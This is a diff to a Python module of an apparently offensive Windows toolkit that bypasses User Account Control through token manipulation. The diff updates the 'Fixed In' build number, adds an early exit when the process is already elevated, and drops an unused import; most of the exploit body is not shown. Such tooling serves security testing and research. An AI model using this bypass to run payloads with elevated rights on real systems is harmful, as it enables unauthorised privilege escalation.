@@ -1,7 +1,6 @@
 from winpwnage.core.prints import *
 from winpwnage.core.utils import *
 from winpwnage.core.winstructures import *
-import os
 
 #Creds to: https://gist.github.com/highsenburger69/b86eb4db41e651a6518fd61d88aa9f91
 
@@ -9,7 +8,7 @@ tokenmanipulation_info = {
 	"Description": "Bypass UAC using token manipulation",
 	"Id": "15",
 	"Type": "UAC bypass",
-	"Fixed In": "99999" if not information().uac_level() == 4 else "0",
+	"Fixed In": "17686" if not information().uac_level() == 4 else "0",
 	"Works From": "7600",
 	"Admin": False,
 	"Function Name": "tokenmanipulation",
@@ -18,6 +17,10 @@ tokenmanipulation_info = {
 
 
 def tokenmanipulation(payload):
+	if information().admin():
+		print_error("Unable to proceed, we are already elevated")
+		return False
+		
 	if payloads().exe(payload):
 		print_info("Launching elevated process")
 		ShellExecute = ShellExecuteInfoW()
@@ -90,4 +93,3 @@ def tokenmanipulation(payload):
 			print_success("Successfully executed payload with PID: {}".format(lpProcessInformation.dwProcessId))
 	else:
 		print_error("Cannot proceed, invalid payload")
-		return False
